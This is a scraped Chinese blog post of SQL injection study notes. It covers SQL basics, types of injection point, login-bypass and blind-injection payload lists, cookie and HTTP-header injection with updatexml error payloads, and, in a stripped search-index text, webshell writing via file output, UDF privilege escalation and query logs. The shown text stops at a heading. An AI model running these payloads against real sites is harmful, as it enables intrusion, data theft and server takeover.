录下的文件中成功写入这里网站的目录要使用双斜杠不然会写不进去第一个斜杠是转义的意思字符串解析不仅仅局限于编译器编译器一些配置文件的解析服务器等等都会遇到对字符串进行解析的这个问题由于传统的采用的是单个斜杠的路径分隔形式导致在对文件路径进行解析的时候可能发生不必要的错误所以就出现了用双反斜杠分隔路径的形式不管解析引擎是否将反斜杠解析成转义字符最终在内存中得到的都是结果也就不会出问题了连接成功连接如果我们将的值为设置为我们在进行上面的写入操作发现并没有写进去所以没有写进去的情况有两种网站的路径不对或者没有使用双斜杠进行转义的值不是为空原理就是使用提权获取也是通过向服务器写入两个文件一个可以直接执行系统命令一个进行上传文件此为的一个命令利用这条命令的先决条件要求为数据库使用查看当前网站连接的数据库账号是否为表中的管理员如是则为没有具体值知道网站的绝对路径使用我们以第一关为例这里需要我们选择网站的脚本语言和网站根路径自带测试常规路径自己填写绝对路径自己填写目录字典我们将字典所在的路径传过去就行爆破路径在指定的目录生成了两个文件文件名是随机的并不是固定的用来执行系统命令用来上传文件的文件内容为访问一下使用上传文件我们上传一个的一句话后门访问所以这两种方式都需要知道网站的绝对路径才行补充上面说了写入的方式有三种缺一不可目录具有写权限能够使用单引号知道网站绝对路径没有具体值在中查看如何寻找文件路径应用的位置默认都在我们一般网页的文件都是在这上面但是如果开发者设计的话可以在后修改网页文件存放位置利用的函数当然得到得信息不会显示出来而是会在保存在的文件夹中找到文件位置打开文件注意是有个需要注意没有关键信息我们再查看其他的配置文件这种文件名一般情况都是默认得到关键文件的路径找到的文件放置的路径这就是我们要上传木马的路径接下来手动用写马都可以这里选的是手动写马继续检测这里又失败了为什么了呢又涉及到经验问题了服务器一般不会给根目录写文件的权限实际上能注入写马的条件比较苛刻不过我们可以继续寻找子文件夹看是否能上传下面也不啰嗦了发现直接是能上传到目录下管理工具连接看到我们可以先使用这个来执行一些语句查看文件路径的路径根目录一般与处于同一目录查看的值是否为空如下为无法写入当为空的时候则什么都不返回其他方法随便传入参数报错可能有相关信息指纹信息收集提权在实际上我们用木马连接后权限可能很小详细如下提权详解这里采用提权的方法这里的提权是应用程序或服务提权提权详解全称为意为用户自定义函数用户可以添加自定义的新函数到中以达到功能的扩充调用方式与一般系统自带的函数相同例如等函数提权步骤把含有自定义函数如执行系统调用函数的文件如为文件等放入特定文件夹下声明引用这个文件中的自定义函数使用这个自定义的函数系统调用完成提权文件后缀一般为由编写先到上找到文件要注意到这个文件的后缀是不是所以还需要编译一下具体原因请仔细看上方链接利用给文件解码修改名称为上传这个文件同样需要路径这里又要引入一个新概念是插件的意思通常是用与对某个现有的架构进行扩展我们把这个文件放入到文件才能真正产生作用实施找到数据库名称密码查找路径上传文件执行系统命令首先在配置文件找到了数据库登陆信息登陆数据库查找路径在该路径把文件上传之后在数据库输入命令执行提权文件命令执行打开如果版本大于文件必须放置在安装目录的文件夹下才可以创建自定义函数该目录默认是不存在的需要使用找到的安装目录并在安装目录下创建文件夹然后将文件导出到该目录如果版本小于文件在下放置在目录中日志马全局日志写马我们所有的数据库的都有一个存放日志的文件这个文件可以会进行记录数据库的操作语句也可能不会记录数据库的操作语句这却决于两个全局变量日志保存状态有两个状态代表开启代表关闭日志的保存路径查看这两个日志文件相关的配置可以看到这里的日志记录状态是处于关闭状态那么我们需要设置以下使这个选项打开打开日志记录设置日志存储路径写马这里需要注意的就是需要使用双斜线然后还有就是日志文件必须是文件防止不能被解析设置完毕之后就是代表着所有的执行语句都会记录到日志文件当中不管执行成功与否查询语句其实就是写马让日志文件众留下这样一句查询语句那么可以使用这个木马了同样也需要知道文件路径慢日志写马慢日志全称为慢查询日志主要用来记录在中执行时间超过指定时间的语句通过慢查询日志可以查找出哪些语句的执行效率低以便进行优化默认情况下并没有开启慢日志可以通过修改参数来打开慢日志与慢日志相关的参数介绍如下是否启用慢查询日志默认为可设置为表示开启指定慢查询日志位置及名称默认值为可指定绝对路径慢查询执行时间阈值超过此时间会记录默认为单位为慢查询日志输出目标默认为即输出到文件主要是控制日志文件中的显示时区默认使用时区建议改为系统时区是否记录所有未使用索引的查询语句默认为对于查询扫描行数小于此参数的将不会记录到慢查询日志中默认为慢速管理语句是否写入慢日志中管理语句包含等默认为即不写入一般情况下我们只需开启慢日志记录配置下阈值时间其余参数可按默认配置对于阈值时间可灵活调整比如说可以设置为或在配置文件中我们可以设置以下几个慢日志相关参数慢查询日志相关配置可根据实际情况修改下面我们具体看下慢日志会记录哪些内容我们执行一条较慢的查询来看下在慢日志中的体现该条执行时间超过阈值测试如果启用了慢速查询日志并且选择了作为输出目标则写入日志的每个语句都以字符开头对于每一组慢第一行记录的是该条执行的时刻如果参数为则改时间会显示时区时间第二行记录的是执行该语句的用户和以及链接第三行的几个字段解释如下语句执行时间以秒为单位获取锁的时间以秒为单位发送给端的行数服务器层检查的行数不计算存储引擎内部的任何处理下面两行分别是此语句执行时候的时间戳和具体慢在实际环境下不建议开启参数此参数打开后可能导致慢日志迅速增长对于慢日志的筛选与分析我们可以借助等工具来分析对于慢日志文件要定期进行归档处理比如可以暂时关闭慢日志然后将旧文件重命名之后再开启慢日志这样就会写入新的日志文件中有效减小日志体积开启日志功能设置日志存储路径执行语句同样需要知道文件路径其他数据库与前面的的注入方式大同小异数据库它的一些主要组件是表格表单报告和查询没有库的概念也是可以用语句查询也可以直接找到他的位置下下来也就是说数据库没有库注入不同的数据库报错回显不同主要靠猜爆破包括之前都是这样通过来有数据为猜完表名字段名后猜字段数据长度用函数然后猜字段数据内容也可以使用猜字段数目然后用跨库查询库名表名的跨库查询更加苛刻基本不用数据库全称也是和相似只是报错信息不同对数据类型严格主要使用报错注入爆库也是猜库名爆表爆列爆数据针对不同的权限有不同的注入手法',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-13 08:36:09',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 5 || hour >= 5
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">VV</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://bu.dusays.com/2024/05/13/6640eacae5439.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>2</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">java安全<sup>1</sup></a><a href="/tags/misc/" style="font-size: 1.05rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>5</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.05rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">学习<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">20</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/web/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>web</span></a><a class="article-meta__tags" href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>后端漏洞</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-05-13T00:31:35.000Z" title="发表于 2024-05-13 08:31:35">2024-05-13</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-05-13T00:36:09.289Z" title="更新于 2024-05-13 08:36:09">2024-05-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">19.4k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>73分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://cszvvds.cc/2024/05/13/SQL%E6%B3%A8%E5%85%A5/"><header><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a><a href="/tags/web/" tabindex="-1" itemprop="url">web</a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" tabindex="-1" itemprop="url">后端漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">SQL注入</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">VVkladg0r</span><time itemprop="dateCreated datePublished" datetime="2024-05-13T00:31:35.000Z" title="发表于 2024-05-13 08:31:35">2024-05-13</time><time itemprop="dateCreated datePublished" datetime="2024-05-13T00:36:09.289Z" title="更新于 2024-05-13 08:36:09">2024-05-13</time></header><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>后端漏洞</p>
<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>SQL 是用于访问和处理数据库的标准的计算机语言</p>
<p>primary key: 主键   用于区分表格中的元素  使元素唯一确定   可以多个</p>
<p>foreign key :外键  用于对应另一表格的主键</p>
<p>创建资料库： CREATE DATABASE <code> 资料库 名字	</code>(反引号);</p>
<p>列出所有资料库：SHOW DATABASES;</p>
<p>删除资料库：DROP DATABASE<code>资料库名字</code>;</p>
<p>选择资料库：USE<code>资料库名</code></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>INT       整数</p>
<p>DECIMAL(X,Y)   有小数点的小数  两个参数</p>
<p>VARCHAR(N)   字符串   n：最多存放的字符数</p>
<p>BLOB:   二进制资料（图片  影片  档案）</p>
<p>DATE:    日期   XX-YY-DD</p>
<p>TIMESTAMP :    记录时间  XXXX-CC-VV  FF:AA:KK</p>
<p>创建表格：CREATE TABLE <code>表格名</code>（</p>
<p>​                   <code>属性名</code>+类型+PK                  </p>
<p>​                   <code>属性名</code>+类型</p>
<p>​                    ……</p>
<p>​              ）；</p>
<p>展示表格： DESCRIBE<code>表格名</code></p>
<p>删除表格：DROP  TABLE<code>表格名</code></p>
<p>新增表格属性：ALTER TABLE<code>表格名</code>ADD  属性 类型</p>
<p>删除表格属性：ALTER TABLE<code>表格名</code>DROP  COLUMN 属性 </p>
<p>向表格中存资料：INSERT INTO 表格名 VALUES 属性</p>
<p>搜寻表格中的全部资料：SELECT*REOM 表格名</p>
<p>限制：在创建TABLE时在属性后可以加限制</p>
<p>​           NOT NULL   不可用为空</p>
<p>​           VNIQUE    不可重复</p>
<p>​          DEFAULT  预设值</p>
<p>​          AUTO-INCREMENT   自动加一</p>
<p>修改资料：UPDATE 表格名  </p>
<p>、              SET 属性名 &#x3D;改后名</p>
<p>​                 WHERE 属性名&#x3D;原来名</p>
<p>删除资料：DELETE FROM 表格名</p>
<p>​                    WHERE 属性&#x3D;XX AND 属性&#x3D;xx                   &lt;, &gt;, &lt;&gt;  ,等也可以</p>
<p>取得资料：SELECT 属性，属性FROM表格    （后面也可以加限制）</p>
<p>排序: ~ORDER BY(属性由高到低 从上到下)   </p>
<p>​                         ~   DESC(反过来)</p>
<p>去不重复的资料： SELECT DISTINCT ~</p>
<p>聚合函数：COUNT    表格中的某属性的总数</p>
<p>​                   AVG         算平均</p>
<p>​                   MAX         算最高</p>
<p>​                   MIN          算最低</p>
<p>​                   SUM        算总和</p>
<p>万用字符：%   多字符     -一个字符</p>
<p>UNION:将XX于XX连接在一起（多个搜寻结合）</p>
<p>JOIN：连结两个表格</p>
<p>子查询:     ~</p>
<p>​                WHERE XX(</p>
<p>SECECT……</p>
<p>)</p>
<p>ON DELETE:若删去一项，则另一项也将改变</p>
<p>​                         ON DELETE  SET NULL   变成NULL</p>
<p>​                         ON DELETE CASCADE     一起删去</p>
<p>单行注释：#      –</p>
<p>   多行注释：&#x2F;*</p>
<p>​                      </p>
<p>​                    *&#x2F;</p>
<p>内联注释：&#x2F;*！</p>
<p>​                           *&#x2F;</p>
<p>   保持与其他数据兼容 在不兼容的数据库中不执行，而在MySQL中执行</p>
<h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><p>原理：通过在向数据库的sql语言中进行一些更改，使原来的指令发生一些改变，进而获取一些本得不到的信息</p>
<p>查库名–&gt;查表名–&gt;查字段</p>
<h3 id="简单分类"><a href="#简单分类" class="headerlink" title="简单分类"></a>简单分类</h3><h4 id="1-按数据类型分类"><a href="#1-按数据类型分类" class="headerlink" title="1.按数据类型分类"></a>1.按数据类型分类</h4><p><code>①数字型注入点</code><br> 在 Web 端大概是 <a target="_blank" rel="noopener" href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 SQL 语句原型大概为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where id=1。组合出来的sql注入语句为：select * from news where id=1 and 1=1</span><br></pre></td></tr></table></figure>

<p><code>②字符型注入点</code><br> 在 Web 端大概是 <a target="_blank" rel="noopener" href="http://xxx.com/news.php?name=admin">http://xxx.com/news.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where name=&#x27;admin&#x27;注意多了引号。组合出来的sql注入语句为：select * from news where chr=&#x27;admin&#x27; and 1=1 &#x27; &#x27;</span><br></pre></td></tr></table></figure>

<p><code>③搜索型注入点</code><br>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword&#x3D;关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 字段 like &#x27;%关键字%&#x27;。</span><br><span class="line"></span><br><span class="line">组合出来的sql注入语句为：</span><br><span class="line">select * from news where search like &#x27;%测试 %&#x27; and &#x27;%1%&#x27;=&#x27;%1%&#x27;</span><br><span class="line"></span><br><span class="line">测试%&#x27; union select 1,2,3,4 and &#x27;%&#x27;=&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="2-按照数据提交的方式来分类"><a href="#2-按照数据提交的方式来分类" class="headerlink" title="2.按照数据提交的方式来分类"></a>2.按照数据提交的方式来分类</h4><p><code>①GET 注入</code><br>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a target="_blank" rel="noopener" href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> , id 是注入点。</p>
<p><code>②POST 注入</code><br>使用 POST 方式提交数据，注入点位置在 POST 数据部分，post提交方式主要适用于表单的提交，用于登录框的注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用的万能username语句：</span><br><span class="line"> a ’ or 1=1 #</span><br><span class="line"> a &quot;) or 1=1 #</span><br><span class="line"> a‘) or 1=1 #</span><br><span class="line"> a” or “1”=”1</span><br><span class="line"> &#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"> &#x27; or (length(database())) = 8  (用于输入’ “都没有错误)</span><br><span class="line"> &#x27; or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)</span><br><span class="line"> &quot;) or (&quot;1&quot;)=(&quot;1</span><br><span class="line"> &quot;) or 1=1 or if(1=1, sleep(1), null)  #</span><br><span class="line"> &quot;) or (length(database())) = 8 #</span><br><span class="line"> &quot;) or (ascii(substr((select database()) ,1,1))) = 115  or if(1=1, sleep(1), null)  #</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post型盲注通杀payload：</span><br><span class="line"></span><br><span class="line">uname=admin%df&#x27;or()or%200%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><code>③Cookie 注入</code><br>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。有报错信息可以利用报错注入</p>
<blockquote>
<p>第一步：寻找参数位置<br>eg：.asp?id&#x3D;xx这样带参数id&#x3D;xx</p>
<p>第二步：去掉参数，观察参数影响<br>eg：将“id&#x3D;xx”删掉，看页面是否正常，正常，则说明参数不起作用。反之不正常，说明参数在数据传递中启直接作用</p>
<p>第三步：（先清空网址）输入“javascript:alert(document.cookie&#x3D;“id&#x3D;”+escape(“xx”));”<br>按Enter键后弹出一个对话框，内容是“id&#x3D;xx”</p>
<p>然后重新输入原来URL回车</p>
<p>如果显示正常，说明是用Request(“id”)方式获取数据</p>
<p>&#x2F;&#x2F;注释</p>
<p><strong>document.cookie:表示当前浏览器中的cookie变量</strong></p>
<p><strong>alert（）:表示弹出一个对话框</strong></p>
<p><strong>escape():对字符串进行编码</strong></p>
<p>第四步：判断是否存在漏洞<br>将SQL判断语句带入，并重复第三步</p>
<p>①“javascript:alert(document.cookie&#x3D;“id&#x3D;”+escape(“xx and 1&#x3D;1”));”</p>
<p>②“javascript:alert(document.cookie&#x3D;“id&#x3D;”+escape(“xx and 1&#x3D;2”));”。</p>
<p>若①正常，②不正常，则说明存在注入漏洞，并可以进行cookie注入</p>
<p>第五步：cookie注入<br>构造cookie注入payload</p>
<p>javascript:alert(document.cookie&#x3D;”smallclass&#x3D;”+escape(“xx order by 2”));</p>
<p>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“284 union select 1,…… from xx”));</p>
</blockquote>
<p>还有结合exists</p>
<ul>
<li>括号中的子查询并不会返回具体的查询到的数据，只是会返回true或者false，如果外层sql的字段在子查询中存在则返回true，不存在则返回false</li>
<li>即使子查询的查询结果是null，只要是对应的字段是存在的，子查询中则返回true</li>
</ul>
<blockquote>
<p>document.cookie&#x3D;”id &#x3D; “ + escape(“105 and exists(select * from 表名)”)</p>
</blockquote>
<p>也可用报错注入</p>
<p><code>④HTTP 头部注入</code><br>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:.........&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</span><br><span class="line">Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</span><br><span class="line">Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br></pre></td></tr></table></figure>

<p><code>User-Agent注入</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:1&#x27; and updatexml(1,concat(0xx5e,version(),0x5e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>


<p><code>Referer 注入</code></p>
